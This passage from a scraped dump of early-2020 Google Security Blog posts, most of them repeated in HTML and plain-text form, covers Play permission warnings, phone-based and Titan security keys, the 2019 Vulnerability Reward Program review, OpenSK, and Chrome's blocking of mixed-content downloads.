when users are given a choice between similar apps, and one of them requests fewer permissions than the other, they choose the app with fewer permissions.2   Determining whether or not a permission request is necessary can be challenging. Android developers request permissions in their apps for many reasons - some related to core functionality, and others related to personalization, testing, advertising, and other factors. To do this, we identify a peer set of apps with similar functionality and compare a developer’s permission requests to that of their peers. If a very large percentage of these similar apps are not asking for a permission, and the developer is, we then let the developer know that their permission request is unusual compared to their peers. Our determination of the peer set is more involved than simply using Play Store categories. Our algorithm combines multiple signals that feed Natural Language Processing (NLP) and deep learning technology to determine this set. A full explanation of our method is outlined in our recent publication, entitled “Reducing Permissions Requests in Mobile Apps” that appeared in the Internet Measurement Conference (IMC) in October 2019.3 (Note that the threshold for surfacing the warning signal, as stated in this paper, is subject to change.)  We surface this information to developers in the Play Console and we let the developer make the final call as to whether or not the permission is truly necessary. It is possible that the developer has a feature unlike all of its peers. Once a developer removes a permission, they won’t see the warning any longer. Note that the warning is based on our computation of the set of peer apps similar to the developers. This is an evolving set, frequently recomputed, so the message may go away if there is an underlying change to the set of peers apps and their behavior. Similarly, even if a developer is not currently seeing a warning about a permission, they might in the future if the underlying peer set and its behavior changes. An example warning is depicted below.     This warning also helps to remind developers that they are not obligated to include all of the permission requests occurring within the libraries they include inside their apps. We are pleased to say that in the first year after deployment of this advice signal nearly 60% of warned apps removed permissions. Moreover, this occurred across all Play Store categories and all app popularity levels. The breadth of this developer response impacted over 55 billion app installs.3 This warning is one component of Google’s larger strategy to help protect users and help developers achieve good security and privacy practices, such as Project Strobe, our guidelines on permissions best practices, and our requirements around safe traffic handling.  Acknowledgements  Giles Hogben, Android Play Dashboard and Pre-Launch Report teams   References [1] Modeling Users’ Mobile App Privacy Preferences: Restoring Usability in a Sea of Permission Settings, by J. Lin B. Liu, N. Sadeh and J. Hong. In Proceedings of Usenix Symposium on Privacy & Security (SOUPS) 2014.  [2] Using Personal Examples to Improve Risk Communication for Security & Privacy Decisions, by M. Harbach, M. Hettig, S. Weber, and M. Smith. In Proceedings of the SIGCHI Conference on Human Computing Factors in Computing Systems, 2014.  [3] Reducing Permission Requests in Mobile Apps, by S. T. Peddinti, I. Bilogrevic, N. Taft, M Pelikan, U. Erlingsson, P. Anthonysamy and G. Hogben. In Proceedings of ACM Internet Measurement Conference (IMC) 2019.     ", "date": "February 27, 2020"},
{"website": "Google-Security", "title": "\nHave an iPhone? Use it to protect your Google Account with the Advanced Protection Program\n", "author": ["Posted by Christiaan Brand, Product Manager, Google Cloud and Kaiyu Yan, Software Engineer, Google"], "link": "https://security.googleblog.com/2020/01/have-iphone-use-it-to-protect-your.html", "abstract": "                             Posted by Christiaan Brand, Product Manager, Google Cloud and Kaiyu Yan, Software Engineer, Google             Phishing&#8212;when an online attacker tries to trick you into giving them your username and password&#8212;is one of the most common causes of account compromises. We recently partnered with The Harris Poll to survey 500 high-risk users (politicians and their staff, journalists, business executives, activists, online influencers) living in the U.S. Seventy-four percent of them reported having been the target of a phishing attempt or compromised by a phishing attack.    Gmail automatically blocks more than 100 million phishing emails every day and warns people that are targeted by government-backed attackers, but you can further strengthen the security of your Google Account by enrolling in the  Advanced Protection Program &#8212;our strongest security protections that automatically help defend against evolving methods attackers use to gain access to your personal and work Google Accounts and data.    Security keys are an important feature of the Advanced Protection Program, because they provide the strongest protection against phishing attacks. In the past, you had to separately purchase and carry physical security keys. Last year, we built security keys  into Android phones &#8212;and starting today, you can activate a security key on your iPhone to help protect your Google Account.                  Activating the security key on your iPhone with Google&#8217;s Smart Lock app         Security keys use public-key cryptography to verify your identity and URL of the login page, so that an attacker can&#8217;t access your account even if they have your username or password. Unlike other two-factor authentication (2FA) methods that try to verify your sign-in, security keys are built with  FIDO standards  that provide the  strongest  protection against automated bots, bulk phishing attacks, and targeted phishing attacks. You can learn more about security keys from our  Cloud Next &#8216;19 presentation .                        Approving the sign-in to a Google Account with Google&#8217;s SmartLock app on an iPhone           On your iPhone, the security key can be activated with Google&#8217;s  Smart Lock app ; on your Android phone, the functionality is built in. The security key in your phone uses Bluetooth to verify your sign-in on Chrome OS, iOS, macOS and Windows 10 devices without requiring you to pair your devices. This helps protect your Google Account on virtually any device with the convenience of your phone.       How to get started       Follow these simple steps to help protect your personal or work Google Account today:      Activate  your phone&#8217;s security key (Android 7+ or iOS 10+)    Enroll  in the Advanced Protection Program   When signing in to your Google Account, make sure Bluetooth is turned on on your phone and the device you&#8217;re signing in on.    We also highly recommend registering a backup security key to your account and keeping it in a safe place, so you can get into your account if you lose your phone. You can get a security key from a number of vendors, including Google, with our own  Titan Security Key .    If you&#8217;re a Google Cloud customer, you can find out more about the Advanced Protection Program for the enterprise  on our G Suite Updates blog .    Here&#8217;s to stronger account security&#8212;right in your pocket.                                   Posted by Christiaan Brand, Product Manager, Google Cloud and Kaiyu Yan, Software Engineer, Google   Phishing—when an online attacker tries to trick you into giving them your username and password—is one of the most common causes of account compromises. We recently partnered with The Harris Poll to survey 500 high-risk users (politicians and their staff, journalists, business executives, activists, online influencers) living in the U.S. Seventy-four percent of them reported having been the target of a phishing attempt or compromised by a phishing attack.  Gmail automatically blocks more than 100 million phishing emails every day and warns people that are targeted by government-backed attackers, but you can further strengthen the security of your Google Account by enrolling in the Advanced Protection Program—our strongest security protections that automatically help defend against evolving methods attackers use to gain access to your personal and work Google Accounts and data.  Security keys are an important feature of the Advanced Protection Program, because they provide the strongest protection against phishing attacks. In the past, you had to separately purchase and carry physical security keys. Last year, we built security keys into Android phones—and starting today, you can activate a security key on your iPhone to help protect your Google Account.      Activating the security key on your iPhone with Google’s Smart Lock app   Security keys use public-key cryptography to verify your identity and URL of the login page, so that an attacker can’t access your account even if they have your username or password. Unlike other two-factor authentication (2FA) methods that try to verify your sign-in, security keys are built with FIDO standards that provide the strongest protection against automated bots, bulk phishing attacks, and targeted phishing attacks. You can learn more about security keys from our Cloud Next ‘19 presentation.         Approving the sign-in to a Google Account with Google’s SmartLock app on an iPhone   On your iPhone, the security key can be activated with Google’s Smart Lock app; on your Android phone, the functionality is built in. The security key in your phone uses Bluetooth to verify your sign-in on Chrome OS, iOS, macOS and Windows 10 devices without requiring you to pair your devices. This helps protect your Google Account on virtually any device with the convenience of your phone.  How to get started  Follow these simple steps to help protect your personal or work Google Account today:  Activate your phone’s security key (Android 7+ or iOS 10+) Enroll in the Advanced Protection Program When signing in to your Google Account, make sure Bluetooth is turned on on your phone and the device you’re signing in on.  We also highly recommend registering a backup security key to your account and keeping it in a safe place, so you can get into your account if you lose your phone. You can get a security key from a number of vendors, including Google, with our own Titan Security Key.  If you’re a Google Cloud customer, you can find out more about the Advanced Protection Program for the enterprise on our G Suite Updates blog.  Here’s to stronger account security—right in your pocket.     ", "date": "January 15, 2020"},
{"website": "Google-Security", "title": "\nVulnerability Reward Program: 2019 Year in Review\n", "author": ["Posted by Natasha Pabrai, Jan Keller, Jessica Lin, Anna Hupa, and Adam Bacchus, Vulnerability Reward Programs at Google"], "link": "https://security.googleblog.com/2020/01/vulnerability-reward-program-2019-year.html", "abstract": "                             Posted by Natasha Pabrai, Jan Keller, Jessica Lin, Anna Hupa, and Adam Bacchus, Vulnerability Reward Programs at Google     Our Vulnerability Reward Programs were created to reward researchers for protecting users by telling us about the security bugs they find. Their discoveries help keep our users, and the internet at large, safe. We look forward to even more collaboration in 2020 and beyond.    2019 has been another record-breaking year for us, thanks to our researchers! We paid out over $6.5 million in rewards, doubling what we&#8217;ve ever paid in a single year. At the same time our researchers decided to donate an all-time-high of $500,000 to charity this year. That&#8217;s 5x the amount we have ever previously donated in a single year. Thanks so much for your hard work and generous giving!         Since 2010, we have expanded our VRPs to cover additional Google product areas, including Chrome, Android, and most recently Abuse. We've also expanded to cover popular third party apps on Google Play, helping identify and disclose vulnerabilities to impacted app developers. Since then we have paid out more than $21 million in rewards*. As we have done in years past, we are sharing our 2019 Year in Review across these programs.          What&#8217;s changed in the past year?        Chrome&#8217;s VRP increased its reward payouts by tripling the maximum baseline reward amount from $5,000 to $15,000 and doubling the maximum reward amount for high quality reports from $15,000 to $30,000. The additional bonus given to bugs found by fuzzers running under the Chrome Fuzzer Program is also doubling to $1,000. More details can be found in their  program rules page .   Android Security Rewards expanded its program with new exploit categories and higher rewards. The top prize is now $1 million for a full chain remote code execution exploit with persistence which compromises the Titan M secure element on Pixel devices. And if you achieve that exploit on specific developer preview versions of Android, we&#8217;re adding in a 50% bonus, making the top prize $1.5 million. See our  program rules page  for more details around our new exploit categories and rewards.   Abuse VRP engaged in outreach and education to increase researchers awareness about the program, presenting an overview of our Abuse program in Australia, Malaysia, Vietnam, the UK and US.   The  Google Play Security Reward Program  expanded scope to any app with over 100 million installs, resulting in over $650,000 in rewards in the second half of 2019.   The  Developer Data Protection Reward Program  was launched in 2019 to identify and mitigate data abuse issues in Android apps, OAuth projects, and Chrome extensions.      We also had the goal of increasing engagement with our security researchers over the last year at events such as  BountyCon  in Singapore and  ESCAL8 in London . These events not only allow us to get to know each of our bug hunters but also provide a space for bug hunters to meet one another and hopefully work together on future exploits.         A hearty thank you to everyone that contributed to the VRPs in 2019. We are looking forward to increasing engagement even more in 2020 as both Google and Chrome VRPs will turn 10. Stay tuned for celebrations. Follow us on  @GoogleVRP      *The total amount was updated on January 28; it previously said we paid out more than $15 million in rewards.                                      Posted by Natasha Pabrai, Jan Keller, Jessica Lin, Anna Hupa, and Adam Bacchus, Vulnerability Reward Programs at Google  Our Vulnerability Reward Programs were created to reward researchers for protecting users by telling us about the security bugs they find. Their discoveries help keep our users, and the internet at large, safe. We look forward to even more collaboration in 2020 and beyond.  2019 has been another record-breaking year for us, thanks to our researchers! We paid out over $6.5 million in rewards, doubling what we’ve ever paid in a single year. At the same time our researchers decided to donate an all-time-high of $500,000 to charity this year. That’s 5x the amount we have ever previously donated in a single year. Thanks so much for your hard work and generous giving!   Since 2010, we have expanded our VRPs to cover additional Google product areas, including Chrome, Android, and most recently Abuse. We've also expanded to cover popular third party apps on Google Play, helping identify and disclose vulnerabilities to impacted app developers. Since then we have paid out more than $21 million in rewards*. As we have done in years past, we are sharing our 2019 Year in Review across these programs.   What’s changed in the past year?   Chrome’s VRP increased its reward payouts by tripling the maximum baseline reward amount from $5,000 to $15,000 and doubling the maximum reward amount for high quality reports from $15,000 to $30,000. The additional bonus given to bugs found by fuzzers running under the Chrome Fuzzer Program is also doubling to $1,000. More details can be found in their program rules page. Android Security Rewards expanded its program with new exploit categories and higher rewards. The top prize is now $1 million for a full chain remote code execution exploit with persistence which compromises the Titan M secure element on Pixel devices. And if you achieve that exploit on specific developer preview versions of Android, we’re adding in a 50% bonus, making the top prize $1.5 million. See our program rules page for more details around our new exploit categories and rewards. Abuse VRP engaged in outreach and education to increase researchers awareness about the program, presenting an overview of our Abuse program in Australia, Malaysia, Vietnam, the UK and US. The Google Play Security Reward Program expanded scope to any app with over 100 million installs, resulting in over $650,000 in rewards in the second half of 2019. The Developer Data Protection Reward Program was launched in 2019 to identify and mitigate data abuse issues in Android apps, OAuth projects, and Chrome extensions.   We also had the goal of increasing engagement with our security researchers over the last year at events such as BountyCon in Singapore and ESCAL8 in London. These events not only allow us to get to know each of our bug hunters but also provide a space for bug hunters to meet one another and hopefully work together on future exploits.    A hearty thank you to everyone that contributed to the VRPs in 2019. We are looking forward to increasing engagement even more in 2020 as both Google and Chrome VRPs will turn 10. Stay tuned for celebrations. Follow us on @GoogleVRP  *The total amount was updated on January 28; it previously said we paid out more than $15 million in rewards.     ", "date": "January 28, 2020"},
{"website": "Google-Security", "title": "\nSay hello to OpenSK: a fully open-source security key implementation\n", "author": ["Posted by Elie Bursztein, Security & Anti-abuse Research Lead, and Jean-Michel Picod, Software Engineer, Google "], "link": "https://security.googleblog.com/2020/01/say-hello-to-opensk-fully-open-source.html", "abstract": "                             Posted by Elie Bursztein, Security &amp; Anti-abuse Research Lead, and Jean-Michel Picod, Software Engineer, Google&nbsp;              Today,  FIDO  security keys are reshaping the way online accounts are protected by providing an easy, phishing-resistant form of two-factor authentication (2FA) that is trusted by a growing number of websites, including Google, social networks, cloud providers, and many others. To help advance and improve access to FIDO authenticator implementations, we are excited, following other open-source projects like Solo and Somu,  to announce the release of  OpenSK , an open-source implementation for security keys written in  Rust  that supports both FIDO U2F and FIDO2 standards.                  Photo of OpenSK developer edition: a Nordic Dongle running the OpenSK firmware on DIY case        By opening up OpenSK as a research platform, our hope is that it will be used by researchers, security key manufacturers, and enthusiasts to help develop innovative features and accelerate security key adoption.    With this early release of OpenSK, you can make your own developer key by flashing the  OpenSK firmware on a  Nordic chip dongle . In addition to being affordable, we chose Nordic as initial reference hardware because it supports all major transport protocols mentioned by  FIDO2 : NFC, Bluetooth Low Energy, USB, and a dedicated hardware crypto core. To protect and carry your key, we are also providing a  custom, 3D-printable case  that works on a variety of printers.    &#8220;We&#8217;re excited to collaborate with Google and the open source community on the new OpenSK research platform,&#8221; said Kjetil Holstad, Director of Product Management at Nordic Semiconductor. &#8220;We hope that our industry leading nRF52840&#8217;s native support for secure cryptographic acceleration combined with new features and testing in OpenSK will help the industry gain mainstream adoption of security keys.&#8221;              While you can make your own fully functional FIDO authenticator today, as showcased in the video above, this release should be considered as an experimental research project to be used for testing and research purposes.      Under the hood, OpenSK is written in  Rust  and runs on  TockOS  to provide better isolation and cleaner OS abstractions in support of security. Rust&#8217;s strong memory safety and zero-cost abstractions makes the code less vulnerable to logical attacks.  TockOS, with its sandboxed architecture , offers the isolation between the security key applet, the drivers, and kernel that is needed to build defense-in-depth. Our TockOS contributions, including our  flash-friendly storage system  and  patches , have all been upstreamed to the TockOS repository. We&#8217;ve done this to encourage everyone to build upon the work.            How to get involved and contribute to OpenSK&nbsp;          To learn more about OpenSK and how to experiment with making your own security key, you can check out our  GitHub repository  today. With the help of the research and developer communities, we hope OpenSK over time will bring innovative features,  stronger embedded crypto, and encourage widespread adoption of trusted phishing-resistant tokens and a passwordless web.       Acknowledgements     We also want to thank our OpenSK collaborators: Adam Langley, Alexei Czeskis, Arnar Birgisson, Borbala Benko, Christiaan Brand, Dirk Balfanz, Dominic Rizzo, Fabian Kaczmarczyck, Guillaume Endignoux, Jeff Hodges, Julien Cretin, Mark Risher, Oxana Comanescu, Tadek Pietraszek                                       Posted by Elie Bursztein, Security & Anti-abuse Research Lead, and Jean-Michel Picod, Software Engineer, Google       Today, FIDO security keys are reshaping the way online accounts are protected by providing an easy, phishing-resistant form of two-factor authentication (2FA) that is trusted by a growing number of websites, including Google, social networks, cloud providers, and many others. To help advance and improve access to FIDO authenticator implementations, we are excited, following other open-source projects like Solo and Somu,  to announce the release of OpenSK, an open-source implementation for security keys written in Rust that supports both FIDO U2F and FIDO2 standards.       Photo of OpenSK developer edition: a Nordic Dongle running the OpenSK firmware on DIY case   By opening up OpenSK as a research platform, our hope is that it will be used by researchers, security key manufacturers, and enthusiasts to help develop innovative features and accelerate security key adoption.  With this early release of OpenSK, you can make your own developer key by flashing the  OpenSK firmware on a Nordic chip dongle. In addition to being affordable, we chose Nordic as initial reference hardware because it supports all major transport protocols mentioned by FIDO2: NFC, Bluetooth Low Energy, USB, and a dedicated hardware crypto core. To protect and carry your key, we are also providing a custom, 3D-printable case that works on a variety of printers.  “We’re excited to collaborate with Google and the open source community on the new OpenSK research platform,” said Kjetil Holstad, Director of Product Management at Nordic Semiconductor. “We hope that our industry leading nRF52840’s native support for secure cryptographic acceleration combined with new features and testing in OpenSK will help the industry gain mainstream adoption of security keys.”       While you can make your own fully functional FIDO authenticator today, as showcased in the video above, this release should be considered as an experimental research project to be used for testing and research purposes.   Under the hood, OpenSK is written in Rust and runs on TockOS to provide better isolation and cleaner OS abstractions in support of security. Rust’s strong memory safety and zero-cost abstractions makes the code less vulnerable to logical attacks. TockOS, with its sandboxed architecture, offers the isolation between the security key applet, the drivers, and kernel that is needed to build defense-in-depth. Our TockOS contributions, including our flash-friendly storage system and patches, have all been upstreamed to the TockOS repository. We’ve done this to encourage everyone to build upon the work.     How to get involved and contribute to OpenSK     To learn more about OpenSK and how to experiment with making your own security key, you can check out our GitHub repository today. With the help of the research and developer communities, we hope OpenSK over time will bring innovative features,  stronger embedded crypto, and encourage widespread adoption of trusted phishing-resistant tokens and a passwordless web.  Acknowledgements  We also want to thank our OpenSK collaborators: Adam Langley, Alexei Czeskis, Arnar Birgisson, Borbala Benko, Christiaan Brand, Dirk Balfanz, Dominic Rizzo, Fabian Kaczmarczyck, Guillaume Endignoux, Jeff Hodges, Julien Cretin, Mark Risher, Oxana Comanescu, Tadek Pietraszek      ", "date": "January 30, 2020"},
{"website": "Google-Security", "title": "\nProtecting users from insecure downloads in Google Chrome\n", "author": ["Posted by Joe DeBlasio, Chrome security team"], "link": "https://security.googleblog.com/2020/02/protecting-users-from-insecure_6.html", "abstract": "                             Posted by Joe DeBlasio, Chrome security team      Update (April 6, 2020): Chrome was originally scheduled to start user-visible warnings on mixed downloads in Chrome 82. These warnings, as well as subsequent blocking, will be delayed by two releases. Console warnings on mixed downloads will begin as scheduled in Chrome 81.        User-visible warnings will start in Chrome 84. The text below has been updated to reflect this change. Developers who are otherwise able to do so are encouraged to transition to secure downloads as soon as possible to avoid future disruption.     Today we&#8217;re announcing that Chrome will gradually ensure that secure (HTTPS) pages only download secure files. In a series of steps outlined below, we&#8217;ll start blocking \"mixed content downloads\" (non-HTTPS downloads started on secure pages). This move follows a  plan we announced last year  to start blocking all insecure subresources on secure pages.    Insecurely-downloaded files are a risk to users' security and privacy. For instance, insecurely-downloaded programs can be swapped out for malware by attackers, and eavesdroppers can read users' insecurely-downloaded bank statements. To address these risks, we plan to eventually remove support for insecure downloads in Chrome.    As a first step, we are focusing on insecure downloads started on secure pages. These cases are especially concerning because Chrome currently gives no indication to the user that their privacy and security are at risk.    Starting in Chrome 84 (to be released July 2020), Chrome will gradually start warning on, and later blocking, these mixed content downloads. File types that pose the most risk to users (e.g., executables) will be impacted first, with subsequent releases covering more file types. This gradual rollout is designed to mitigate the worst risks quickly, provide developers an opportunity to update sites, and minimize how many warnings Chrome users have to see.        We plan to roll out restrictions on mixed content downloads on desktop platforms (Windows, macOS, Chrome OS and Linux) first. Our plan for desktop platforms is as follows:                                In  Chrome 81&nbsp; (released March 2020) and later:     Chrome will print a  console message  warning about all mixed content downloads.         In  Chrome 84&nbsp; (released July 2020):     Chrome will  warn  on mixed content downloads of executables (e.g. .exe).         In  Chrome 85 &nbsp;(released August 2020):     Chrome will  block  mixed  content executables .   Chrome will  warn  on mixed content  archives  (.zip) and  disk images  (.iso).         In  Chrome 86 &nbsp;(released October 2020):     Chrome will  block  mixed content  executables, archives and disk images.    Chrome will  warn on all other mixed content downloads  except image, audio, video and text formats.         In  Chrome 87 &nbsp;(released November 2020):     Chrome will  warn  on mixed content downloads of  images, audio, video, and text .   Chrome will  block all other mixed content downloads .         In  Chrome 88 &nbsp;(released January 2021) and beyond, Chrome will block all mixed content downloads.                                    Example of a potential warning                       Chrome will delay the rollout for Android and iOS users by one release, starting warnings in Chrome 85. Mobile platforms have better native protection against malicious files, and this delay will give developers a head-start towards updating their sites before impacting mobile users.&nbsp;          Developers can prevent users from ever seeing a download warning by ensuring that downloads only use HTTPS. In the current version of Chrome Canary, or in Chrome 81 once released, developers can activate a warning on all mixed content downloads for testing by enabling the \"Treat risky downloads over insecure connections as active mixed content\" flag at  chrome://flags/#treat-unsafe-downloads-as-active-content .&nbsp;         Enterprise and education customers can disable blocking on a per-site basis via the existing  InsecureContentAllowedForUrls  policy by adding a pattern matching the page requesting the download.&nbsp;         In the future, we expect to further restrict insecure downloads in Chrome. We encourage developers to fully migrate to HTTPS to avoid future restrictions and fully protect their users. Developers with questions are welcome to email us at security-dev@chromium.org.&nbsp;         Posted by Joe DeBlasio, Chrome Security team                                                     Posted by Joe DeBlasio, Chrome security team  Update (April 6, 2020): Chrome was originally scheduled to start user-visible warnings on mixed downloads in Chrome 82. These warnings, as well as subsequent blocking, will be delayed by two releases. Console warnings on mixed downloads will begin as scheduled in Chrome 81.  User-visible warnings will start in Chrome 84. The text below has been updated to reflect this change. Developers who are otherwise able to do so are encouraged to transition to secure downloads as soon as possible to avoid future disruption.  Today we’re announcing that Chrome will gradually ensure that secure (HTTPS) pages only download secure files. In a series of steps outlined below, we’ll start blocking \"mixed content downloads\" (non-HTTPS downloads started on secure pages). This move follows a plan we announced last year to start blocking all insecure subresources on secure pages.  Insecurely-downloaded files are a risk to users' security and privacy. For instance, insecurely-downloaded programs can be swapped out for malware by attackers, and eavesdroppers can read users' insecurely-downloaded bank statements. To address these risks, we plan to eventually remove support for insecure downloads in Chrome.  As a first step, we are focusing on insecure downloads started on secure pages. These cases are especially concerning because Chrome currently gives no indication to the user that their privacy and security are at risk.  Starting in Chrome 84 (to be released July 2020), Chrome will gradually start warning on, and later blocking, these mixed content downloads. File types that pose the most risk to users (e.g., executables) will be impacted first, with subsequent releases covering more file types. This gradual rollout is designed to mitigate the worst risks quickly, provide developers an opportunity to update sites, and minimize how many warnings Chrome users have to see.    We plan to roll out restrictions on mixed content downloads on desktop platforms (Windows, macOS, Chrome OS and Linux) first. Our plan for desktop platforms is as follows:       In Chrome 81 (released March 2020) and later:  Chrome will print a console message warning about all mixed content downloads.    In Chrome 84 (released July 2020):  Chrome will warn on mixed content downloads of executables (e.g. .exe).    In Chrome 85 (released August 2020):  Chrome will block mixed content executables. Chrome will warn on mixed content archives (.zip) and disk images (.iso).    In Chrome 86 (released October 2020):  Chrome will block mixed content executables, archives and disk images. Chrome will warn on all other mixed content downloads except image, audio, video and text formats.    In Chrome 87 (released November 2020):  Chrome will warn on mixed content downloads of images, audio, video, and text. Chrome will block all other mixed content downloads.    In Chrome 88 (released January 2021) and beyond, Chrome will block all mixed content downloads.            Example of a potential warning        Chrome will delay the rollout for Android and iOS users by one release, starting warnings in Chrome 85. Mobile platforms have better native protection against malicious files, and this delay will give developers a head-start towards updating their sites before impacting mobile users.     Developers can prevent users from ever seeing a download warning by ensuring that downloads only use HTTPS. In the current version of Chrome Canary, or in Chrome 81 once released, developers can activate a warning on all mixed content downloads for testing by enabling the \"Treat risky downloads over insecure connections as active mixed content\" flag at chrome://flags/#treat-unsafe-downloads-as-active-content.     Enterprise and education customers can disable blocking on a per-site basis via the existing InsecureContentAllowedForUrls policy by adding a pattern matching the page requesting the download.     In the future, we expect to further restrict insecure downloads in Chrome. We encourage developers to fully migrate to HTTPS to avoid future restrictions and fully protect their users. Developers with questions are welcome to email us at security-dev@chromium.org.     Posted by Joe DeBlasio, Chrome Security team          ", "date": "February 6, 2020"},
{"website": "Google-Security", "title": "\nHow we fought bad apps and malicious developers in 2019\n", "author": [], "link": "https://security.googleblog.com/2020/02/how-we-fought-bad-apps-and-malicious.html", "abstract": "                                   Posted by Andrew Ahn, Product Manager, Google Play + Android App Safety     [Cross-posted from the  Android Developers Blog ]           Google Play connects users with great digital experiences to help them be more productive and entertained, as well as providing app developers with tools to reach billions of users around the globe. Such a thriving ecosystem can only be achieved and sustained when trust and safety is one of its key foundations. Over the last few years we&#8217;ve made the trust and safety of Google Play a top priority, and have continued our investments and improvements in our abuse detection systems, policies, and teams to fight against bad apps and malicious actors.    In 2019, we continued to strengthen our policies (especially to  better protect kids and families ), continued to improve  our developer approval process , initiated a deeper collaboration with security industry partners through the  App Defense Alliance , enhanced our machine learning detection systems analyzing an app&#8217;s code, metadata, and user engagement signals for any suspicious content or behaviors, as well as scaling the number and the depth of manual reviews. The combination of these efforts have resulted in a much cleaner Play Store:       Google Play released a  new policy  in 2018 to stop apps from unnecessarily accessing privacy-sensitive SMS and Call Log data. We saw a  significant, 98% decrease in apps accessing SMS and Call Log data  as developers partnered with us to update their apps and protect users. The remaining 2% are comprised of apps that require SMS and Call Log data to perform their core function.     One of the best ways to protect users from bad apps is to keep those apps out of the Play Store in the first place. Our improved vetting mechanisms  stopped over 790,000 policy-violating app submissions before they were ever published to the Play Store .     Similarly to our SMS and Call Log policy, we also enacted a  policy  to better protect families in May 2019. After putting this in place, we worked with developers to  update or remove tens of thousands of apps,  making the Play Store a safer place for everyone.     In addition we&#8217;ve launched a refreshed  Google Play Protect  experience, our built-in malware protection for Android devices. Google Play Protect scans over 100B apps everyday, providing users with information about potential security issues and actions they can take to keep their devices safe and secure. Last year, Google Play Protect also prevented more than 1.9B malware installs from non-Google Play sources.    While we are proud of what we were able to achieve in partnership with our developer community, we know there is more work to be done. Adversarial bad actors will continue to devise new ways to evade our detection systems and put users in harm's way for their own gains. Our commitment in building the world's safest and most helpful app platform will continue in 2020, and we will continue to invest in the key app safety areas mentioned in last year&#8217;s  blog post :       Strengthening app safety policies to protect user privacy     Faster detection of bad actors and blocking repeat offenders     Detecting and removing apps with harmful content and behaviors     Our teams of passionate product managers, engineers, policy experts, and operations leaders will continue to work with the developer community to accelerate the pace of innovation, and deliver a safer app store to billions of Android users worldwide.                                             Posted by Andrew Ahn, Product Manager, Google Play + Android App Safety  [Cross-posted from the Android Developers Blog]     Google Play connects users with great digital experiences to help them be more productive and entertained, as well as providing app developers with tools to reach billions of users around the globe. Such a thriving ecosystem can only be achieved and sustained when trust and safety is one of its key foundations. Over the last few years we’ve made the trust and safety of Google Play a top priority, and have continued our investments and improvements in our abuse detection systems, policies, and teams to fight against bad apps and malicious actors.   In 2019, we continued to strengthen our policies (especially to better protect kids and families), continued to improve our developer approval process, initiated a deeper collaboration with security industry partners through the App Defense Alliance, enhanced our machine learning detection systems analyzing an app’s code, metadata, and user engagement signals for any suspicious content or behaviors, as well as scaling the number and the depth of manual reviews. The combination of these efforts have resulted in a much cleaner Play Store:    Google Play released a new policy in 2018 to stop apps from unnecessarily accessing privacy-sensitive SMS and Call Log data. We saw a significant, 98% decrease in apps accessing SMS and Call Log data as developers partnered with us to update their apps and protect users. The remaining 2% are comprised of apps that require SMS and Call Log data to perform their core function.   One of the best ways to protect users from bad apps is to keep those apps out of the Play Store in the first place. Our improved vetting mechanisms stopped over 790,000 policy-violating app submissions before they were ever published to the Play Store.   Similarly to our SMS and Call Log policy, we also enacted a policy to better protect families in May 2019. After putting this in place, we worked with developers to update or remove tens of thousands of apps, making the Play Store a safer place for everyone.   In addition we’ve launched a refreshed Google Play Protect experience, our built-in malware protection for Android devices. Google Play Protect scans over 100B apps everyday, providing users with information about potential security issues and actions they can take to keep their devices safe and secure. Last year, Google Play Protect also prevented more than 1.9B malware installs from non-Google Play sources.   While we are proud of what we were able to achieve in partnership with our developer community, we know there is more work to be done. Adversarial bad actors will continue to devise new ways to evade our detection systems and put users in harm's way for their own gains. Our commitment in building the world's safest and most helpful app platform will continue in 2020, and we will continue to invest in the key app safety areas mentioned in last year’s blog post:    Strengthening app safety policies to protect user privacy   Faster detection of bad actors and blocking repeat offenders   Detecting and removing apps with harmful content and behaviors   Our teams of passionate product managers, engineers, policy experts, and operations leaders will continue to work with the developer community to accelerate the pace of innovation, and deliver a safer app store to billions of Android users worldwide.        ", "date": "February 11, 2020"},
{"website": "Google-Security", "title": "\nTitan Security Keys - now available in Austria, Canada, France, Germany, Italy, Japan, Spain, Switzerland, and the UK \n", "author": ["Posted by Christiaan Brand, Product Manager, Google Cloud "], "link": "https://security.googleblog.com/2020/02/titan-security-keys-now-available-in.html", "abstract": "                             Posted by Christiaan Brand, Product Manager, Google Cloud&nbsp;     Security keys provide the  strongest  protection against phishing attacks. That&#8217;s why they are an important feature of  the Advanced Protection Program  that provides Google&#8217;s strongest account protections for users that consider themselves at a higher risk of targeted, sophisticated attacks on their personal or work Google Accounts.  Last year, we made the Titan Security Key bundle with USB-A/NFC and Bluetooth/USB/NFC keys available in Canada, France, Japan, the UK, and the US. Starting today, USB-C Titan Security Keys are available in those countries, and the bundle and USB-C Titan Security Keys are now available on the  Google Store  in Austria, Germany, Italy, Spain, and Switzerland.                Titan Security Keys are now available in 10 countries        Security keys use public-key cryptography to verify your identity and URL of the login page so that an attacker can&#8217;t access your account even if they have your username or password. Unlike other two-factor authentication (2FA) methods that try to verify your sign-in, security keys support  FIDO standards  that provide the  strongest  protection against automated bots, bulk phishing attacks, and targeted phishing attacks.   We highly recommend users at a higher risk of targeted attacks (e.g., political campaign teams, activists, journalists, IT administrators, executives) to get Titan Security Keys and enroll into the  Advanced Protection Program  (APP). If you&#8217;re working in a federal political campaigns team in the US, you can now  request free Titan Security Keys  via Defending Digital Campaigns and get help enrolling into the APP.  Bulk orders  are also available for enterprise organizations in select countries.  You can also use Titan Security Keys for any site where FIDO security keys are supported for 2FA, including your personal or work  Google Account ,  1Password ,  Bitbucket ,  Bitfinex ,  Coinbase ,  Dropbox ,  Facebook ,  GitHub ,  Salesforce ,  Stripe ,  Twitter , and more.                                   Posted by Christiaan Brand, Product Manager, Google Cloud   Security keys provide the strongest protection against phishing attacks. That’s why they are an important feature of the Advanced Protection Program that provides Google’s strongest account protections for users that consider themselves at a higher risk of targeted, sophisticated attacks on their personal or work Google Accounts.Last year, we made the Titan Security Key bundle with USB-A/NFC and Bluetooth/USB/NFC keys available in Canada, France, Japan, the UK, and the US. Starting today, USB-C Titan Security Keys are available in those countries, and the bundle and USB-C Titan Security Keys are now available on the Google Store in Austria, Germany, Italy, Spain, and Switzerland.     Titan Security Keys are now available in 10 countries   Security keys use public-key cryptography to verify your identity and URL of the login page so that an attacker can’t access your account even if they have your username or password. Unlike other two-factor authentication (2FA) methods that try to verify your sign-in, security keys support FIDO standards that provide the strongest protection against automated bots, bulk phishing attacks, and targeted phishing attacks. We highly recommend users at a higher risk of targeted attacks (e.g., political campaign teams, activists, journalists, IT administrators, executives) to get Titan Security Keys and enroll into the Advanced Protection Program (APP). If you’re working in a federal political campaigns team in the US, you can now request free Titan Security Keys via Defending Digital Campaigns and get help enrolling into the APP. Bulk orders are also available for enterprise organizations in select countries.You can also use Titan 